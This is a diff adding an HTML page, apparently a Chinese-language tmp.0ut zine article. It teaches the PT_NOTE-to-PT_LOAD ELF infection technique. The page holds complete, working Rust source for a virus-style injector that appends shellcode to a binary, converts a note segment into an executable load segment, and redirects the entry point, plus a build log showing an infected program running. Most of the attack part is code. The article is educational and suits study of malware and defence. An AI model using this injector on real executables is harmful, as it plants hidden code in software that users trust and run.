@@ -1,0 +1,266 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("../gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+   \_______________________________________________________________________/
+o_/_________________________________________________________________________\_o
+   | |          ___________                              __              | |
+   | |          \__    ___/____ ______      ____  __ ___/  |_            | |
+   | |            |    | /     \\____ \    /  _ \|  |  \   __\           | |
+   | |            |    ||  Y Y  \  |_&gt; &gt;  (  &lt;_&gt; )  |  /|  |             | |
+   | |            |____||__|_|  /   __/ /\ \____/|____/ |__|             | |
+   | |                        \/|__|    \/                               | |
+   | |                                                                   | |
+   | |         ::: PT_NOTE到PT_LOAD的ELF注入器（Rust版本）:::           | |
+   | |              `- 来自d3npa和tmp.0ut的爱 &lt;3                        | |
+   | |                                                                   | |
+
++------------------------------------------------------------------------------
+| 日本语版本在Github上可用 / 日本語版はGithubにてご覧できます
+| https://github.com/d3npa/hacking-trix-rust/blob/main/elf/ptnote-infector
++------------------------------------------------------------------------------
+
+我在SymbolCrash博客上读到一种技术，通过将程序头中的PT_NOTE转换为PT_LOAD来向ELF二进制文件
+注入shellcode。我觉得这很有趣，而且我对ELF了解不多，所以我把它当作一个机会来同时学习许多
+新东西。
+
+对于这个项目，我创建了一个小型的、非常不完整的库，我称之为mental_elf，它使解析和写入ELF
+元数据变得更容易。我认为库代码非常直观且易于理解，所以我在这里不会再多谈。
+
+====[ 概述 ]===============================================================
+
+正如标题所暗示的，这种感染技术涉及将ELF的`PT_NOTE`程序头转换为`PT_LOAD`以运行shellcode。
+感染可以归结为三个步骤：
+
+    - 将shellcode附加到ELF文件的末尾
+    - 将shellcode加载到虚拟内存中的特定地址
+    - 将ELF的入口点更改为上述地址，以便首先执行shellcode
+
+shellcode还应该针对每个ELF进行修补，使其跳回到宿主ELF的原始入口点，允许宿主在shellcode
+完成后正常执行。
+
+shellcode可以通过PT_LOAD头加载到虚拟内存中。将新的程序头插入ELF文件可能会破坏二进制文件
+中的许多偏移，但通常可以重新利用PT_NOTE头而不破坏二进制文件。
+
+以下是ELF规范中关于Note段的说明：
+
+    +--------------------------------------------------------------------------
+    | Note信息是可选的。Note信息的存在不会影响程序的ABI一致性，前提是该信息
+    | 不影响程序的执行行为。否则，程序就不符合ABI并具有未定义的行为。
+    +--------------------------------------------------------------------------
+
+以下是我意识到的两个注意事项：
+
+    - 这种简单的技术不适用于PIE。
+    - Go语言运行时实际上需要一个包含版本信息的有效PT_NOTE段才能运行，所以这种技术
+      不能用于Go二进制文件。
+
+注意：PIE可以在cc中使用`-no-pie`禁用，或在rustc中使用`-C relocation-model=static`禁用
+
+====[ shellcode ]==============================================================
+
+提供的shellcode是为Netwide ASseMbler (NASM)编写的。在运行Makefile之前，请确保安装了
+`nasm`！
+
+要创建适合此注入的shellcode，需要记住几点。AMD64系统V ABI的3.4.1节说，在入口之前必须将
+rbp、rsp和rdx寄存器设置为正确的值。这可以通过在shellcode周围进行普通的压栈和出栈来实现。
+
+我的shellcode不会触及rbp或rsp，在返回之前将rdx设置为零也可以工作。
+
+shellcode还需要进行修补，以便在完成后实际跳回到宿主的原始入口点。为了使修补更容易，
+shellcode可以设计为从文件末尾运行，可以是自上而下编写，也可以跳转到末尾的空标签：
+
+    +--------------------------------------------------------------------------
+    | main_tasks:
+    |    ; ...
+    |    jmp finish
+    | other_tasks:
+    |     ; ...
+    | finish:
+    +--------------------------------------------------------------------------
+
+使用这种设计，修补就像附加一个跳转指令一样简单。然而，在x86_64中，jmp不能接受64位操作数 - 
+相反，目标存储在rax中，然后执行jmp rax。这个rust片段修补"shellcode"字节向量以附加一个
+跳转到entry_point：
+
+    +--------------------------------------------------------------------------
+    | fn patch_jump(shellcode: &mut Vec&lt;u8&gt;, entry_point: u64) {
+    |     // 将entry_point存储在rax中
+    |     shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
+    |     shellcode.extend_from_slice(&entry_point.to_ne_bytes());
+    |     // 跳转到rax中的地址
+    |     shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
+    | }
+    +--------------------------------------------------------------------------
+
+====[ 注入器 ]===============================================================
+
+注入器本身在src/main.rs中。它以易于理解的自上而下格式编写，所以如果你理解了概述，它应该
+非常清晰。我还添加了注释以帮助理解。代码使用我的mental_elf库来抽象读写文件的细节，这样
+更容易看到技术的本质。
+
+总的来说，代码：
+
+- 接受2个CLI参数：ELF目标和shellcode文件
+- 从ELF文件中读取ELF和程序头
+- 用跳转到原始入口点的指令修补shellcode
+- 将修补后的shellcode附加到ELF
+- 找到一个`PT_NOTE`程序头并将其转换为`PT_LOAD`
+- 将ELF的入口点更改为shellcode的开始
+- 将更改后的头结构保存回ELF文件
+
+当运行受感染的ELF文件时，ELF加载器会将ELF文件的几个部分映射到虚拟内存中 - 我们创建的
+PT_LOAD将确保我们的shellcode被加载并可执行。然后ELF的入口点开始执行shellcode。当
+shellcode结束时，它将跳转到原始入口点，允许二进制文件运行其原始代码。
+
+    +--------------------------------------------------------------------------
+    | $ make
+    | cd files && make && cd ..
+    | make[1]: Entering directory '/.../files'
+    | rustc -C opt-level=z -C debuginfo=0 -C relocation-model=static target.rs
+    | nasm -o shellcode.o shellcode.s
+    | make[1]: Leaving directory '/.../files'
+    | cargo run --release files/target files/shellcode.o
+    | Compiling mental_elf v0.1.0 
+    (https://github.com/d3npa/mental-elf#0355d2d3)
+    | Compiling ptnote-to-ptload-elf-injection v0.1.0 (/...)
+    |     Finished release [optimized] target(s) in 1.15s
+    |     Running `target/release/ptnote-to-ptload-elf-injection files/target 
+    files/shellcode.o`
+    | Found PT_NOTE section; converting to PT_LOAD
+    | echo 'Done! Run target with: `./files/target`'
+    | Done! Run target with: `./files/target`
+    | $ ./files/target
+    | dont tell anyone im here
+    | hello world!
+    | $
+    +--------------------------------------------------------------------------
+
+====[ 结语 ]================================================================
+
+这是一个非常有趣的项目！我学到了很多关于Rust、ELF和病毒的知识。感谢tmp.out的netspooky、
+sblip、TMZ和其他人教导我、帮助我调试并激励我完成这个项目 &lt;3
+
+其他链接：
+- https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+- http://www.skyfree.org/linux/references/ELF_Format.pdf
+- https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf
+- https://github.com/d3npa/mental-elf
+
+源代码如下：
+
+------------------------------------------------------------------------------
+  Cargo.toml
+------------------------------------------------------------------------------
+
+[package]
+...
+
+[dependencies.mental_elf]
+git = "https://github.com/d3npa/mental-elf"
+rev = "0355d2d35558e092a038589fc8b98ac9bc70c37b"
+
+------------------------------------------------------------------------------
+  main.rs
+------------------------------------------------------------------------------
+
+use mental_elf::elf64::constants::*;
+use std::{env, fs, process};
+use std::io::prelude::*;
+use std::io::SeekFrom;
+
+fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
+    let args: Vec&lt;String&gt; = env::args().collect();
+    if args.len() != 3 {
+        eprintln!("Usage: {} &lt;ELF File&gt; &lt;Shellcode File&gt;", args[0]);
+        process::exit(1);
+    }
+
+    let elf_path = &args[1];
+    let sc_path = &args[2];
+
+    // 以RW权限打开目标ELF文件
+    let mut elf_fd = fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(&elf_path)?;
+
+    // 从文件加载shellcode
+    let mut shellcode: Vec&lt;u8&gt; = fs::read(&sc_path)?;
+
+    // 解析ELF和程序头
+    let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
+    let mut program_headers = mental_elf::read_elf64_program_headers(
+        &mut elf_fd, 
+        elf_header.e_phoff, 
+        elf_header.e_phnum,
+    )?;
+
+    // 修补shellcode，使其在完成后跳转到原始入口点
+    patch_jump(&mut shellcode, elf_header.e_entry);
+
+    // 将shellcode附加到目标ELF的最末尾
+    elf_fd.seek(SeekFrom::End(0))?;
+    elf_fd.write(&shellcode)?;
+
+    // 计算用于修补ELF和程序头的偏移
+    let sc_len = shellcode.len() as u64;
+    let file_offset = elf_fd.metadata()?.len() - sc_len;
+    let memory_offset = 0xc00000000 + file_offset;
+
+    // 寻找PT_NOTE段
+    for phdr in &mut program_headers {
+        if phdr.p_type == PT_NOTE {
+            // 转换为PT_LOAD段，设置值以加载shellcode
+            println!("Found PT_NOTE section; converting to PT_LOAD");
+            phdr.p_type = PT_LOAD;
+            phdr.p_flags = PF_R | PF_X;
+            phdr.p_offset = file_offset;
+            phdr.p_vaddr = memory_offset;
+            phdr.p_memsz += sc_len as u64;
+            phdr.p_filesz += sc_len as u64;
+            // 修补ELF头以从shellcode开始
+            elf_header.e_entry = memory_offset;
+            break;
+        }
+    }
+
+    // 将更改提交到程序和ELF头
+    mental_elf::write_elf64_program_headers(
+        &mut elf_fd, 
+        elf_header.e_phoff,
+        elf_header.e_phnum,
+        program_headers,
+    )?;
+    mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;
+
+    Ok(())
+}
+
+fn patch_jump(shellcode: &mut Vec&lt;u8&gt;, entry_point: u64) {
+    // 将entry_point存储在rax中
+    shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
+    shellcode.extend_from_slice(&entry_point.to_ne_bytes());
+    // 跳转到rax中的地址
+    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
+}
+
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+</pre></div></center>
+</body>
+</html> 
